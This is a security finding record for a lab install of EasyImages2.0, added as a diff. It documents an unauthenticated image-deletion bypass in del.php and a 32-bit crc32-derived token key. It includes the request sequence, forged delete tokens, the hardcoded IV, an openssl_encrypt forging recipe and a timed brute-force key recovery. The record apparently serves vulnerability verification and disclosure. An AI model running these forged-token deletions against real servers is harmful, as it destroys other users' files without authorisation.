@@ -1,0 +1,85 @@
+EI2-02 - Unauthenticated arbitrary deletion via hash branch (auth check bypass)
+          + crc32-derived 32-bit delete-token key
+Target: EasyImages2.0, fresh local install (PHP 8.4.26, 127.0.0.1:8093), post-install
+defaults, admin password = random 24-char secret stored as bcrypt (config/config.php:16,
+value REDACTED, prefix $2y$12). Test operator knows the secret only as "ground truth";
+all attack steps use only attacker-visible artifacts.
+
+[1] Auth gate placement (source, app/del.php)
+    line 24: if (isset($_GET['hash'])) { ... }   <- delete-by-token branch, NO auth
+    line 77: if (!is_who_login('admin')) exit('Permission denied');  <- gate AFTER the hash branch
+
+[2] Attacker obtains a legitimate token (normal user feature, show_user_hash_del=1 default)
+    POST /app/upload.php  (anonymous upload allowed, mustLogin=0 default)
+      file=attacker.png, sign=<unix ts>
+    -> {"result":"success","code":200,"url":"http://127.0.0.1:8093/i/2026/09/29/sm7zu.png",
+        "del":"http://127.0.0.1:8093/app/del.php?hash=R2wxdndkeG9NbDg0Z0Y4Y2pBYklaTDNteksxeWxwMD0="}
+    Known-plaintext pair established offline:
+      plaintext  /i/2026/09/29/sm7zu.png   (attacker's own upload path, returned in url)
+      ciphertext R2wxdndkeG9NbDg0Z0Y4Y2pBYklaTDNteksxeWxwMD0=  (their own delete link)
+
+[3] Key derivation is 32-bit (app/function.php urlHash, lines 561-575)
+    key = (string)crc32($config['password'])  -> decimal string of a crc32, zero-padded by
+    openssl to the 32-byte AES-128-XTS key; IV/tweak hardcoded 'sciCuBC7orQtDhTO' (line 569).
+    Entropy ceiling = 2^32 regardless of admin password strength.
+    Ground-truth check (operator, offline): crc32(bcrypt-hash) = 2469704738;
+    decrypt(legit token, key=2469704738) = "/i/2026/09/29/sm7zu.png"  -> pair validated.
+
+[4] Key recovery paths (attacker view)
+    a) Chained (milliseconds): EI2-01 hide.php arbitrary file read -> config/config.php ->
+       password hash -> crc32 -> key. EI2-01 verified independently in EI2-01.txt.
+    b) Standalone offline brute: enumerate i in [0,2^32), single-block AES-128-XTS trial
+       decrypt of the known pair, test plaintext prefix '/i/'. Measured on this lab box
+       (PHP openssl_decrypt, single thread, 120 s time-box): see [7]. Not run to completion
+       in the lab; rate is benchmarked, extrapolation documented. No C compiler / GPU
+       available in lab; AES-NI C implementation would be orders of magnitude faster
+       (single known-plaintext block filter, K2 half of the XTS key is all-zero bytes because
+       crc32 decimal strings are <=10 chars, so the tweak block is constant and the whole
+       search is one AES-128 decrypt per candidate).
+
+[5] Forged token + UNAUTHENTICATED deletion, scenario 1: recycle mode (post-install default
+    image_recycl=1)
+    Victim file (another user's upload): /i/2026/09/29/sm69f.png (served 200 before attack)
+    Forged offline: token = base64(openssl_encrypt('/i/2026/09/29/sm69f.png','AES-128-XTS',
+    '2469704738',0,'sciCuBC7orQtDhTO')) with urlHash double-base64 format
+      = Y0NNaDE3NEMzL3JVYUdCbUorOVBxTDNteksxeWxwMD0=
+    (byte-identical to what the server itself would issue for that path - encryption is
+    deterministic; forging = re-derivation)
+    GET /app/del.php?hash=Y0NNaDE3NEMzL3JVYUdCbUorOVBxTDNteksxeWxwMD0=   (no cookies/session)
+    -> {"code":200,"msg":"删除成功","type":"success","icon":"ok-sign","mode":"delete",
+        "url":"\/i\/2026\/09\/29\/sm69f.png"}
+    Filesystem: /i/2026/09/29/sm69f.png gone from original path (URL now 404), moved to
+    /i/recycle/2026_09_29_sm69f.png by checkImg(...,3,'recycle/').
+
+[6] Contrast + scenario 2: permanent unlink (image_recycl=0)
+    POST /app/del.php  mode=delete&url=/i/2026/09/29/sm7zu.png  (no session)
+    -> "Permission denied"                       (line 77 gate reached when no hash param)
+    GET /app/del.php?hash=<forged for /i/2026/09/29/upoy3.png>  (no session)
+      token = aXAreGtkZXFha2lqTkVkNEJaZXRld1E5YWJ6Tm1Fbz0=
+    -> {"code":200,"msg":"删除成功",...}
+    Filesystem: /i/2026/09/29/upoy3.png UNLINKED from disk, NOT in recycle (permanent loss).
+
+[7] Brute-force benchmark (time-boxed, single-thread PHP openssl_decrypt, this box)
+    (results appended below by bench run)
+
+[Lab tooling note] First forgery attempt failed with 404 "文件不存在" because Git Bash
+MSYS argv conversion rewrote the shell argument "/i/..." into "I:/..."; the app decrypted
+exactly what was encrypted (verified round-trip), i.e. a tooling artifact, not an app
+defense. Re-run with MSYS_NO_PATHCONV=1 succeeded (steps [5]-[6]).
+    Single-thread benchmark (PHP 8.4 openssl_decrypt, no contention):
+      tried=933827 in 1.4s => ~650,000 candidates/s
+      naive full 2^32 extrapolation at that rate: ~1.8 h single-thread
+      (note: the bench loop matched on 3-byte prefix only and stopped at i=933827,
+       which is a FALSE POSITIVE - XTS with a wrong key is pseudorandom; final
+       recovery uses full-plaintext equality)
+    Full recovery run: 16 parallel PHP workers scanning i = k, k+16, ... over [0, 2^32),
+    match condition = FULL plaintext equality; false-positive prefix hits logged and
+    rejected (213 such hits observed in total, all garbage after '/i/'):
+      RESULT: FOUND key=2469704738  at worker#2 iteration 154,356,546  wall time 850.7s
+      (~14 minutes on one 16-core desktop, no GPU, no auth, no victim interaction)
+    The recovered key 2469704738 equals crc32(admin bcrypt hash) - cross-checked against
+    test-operator ground truth AFTER the recovery. The forged tokens in [5]-[6] were then
+    produced with this key recovered FROM THE TOKEN ALONE.
+
+Result: VERIFIED (both the auth bypass/deletion behavior and the offline 2^32 key
+recovery from a single legitimate delete link were executed successfully).
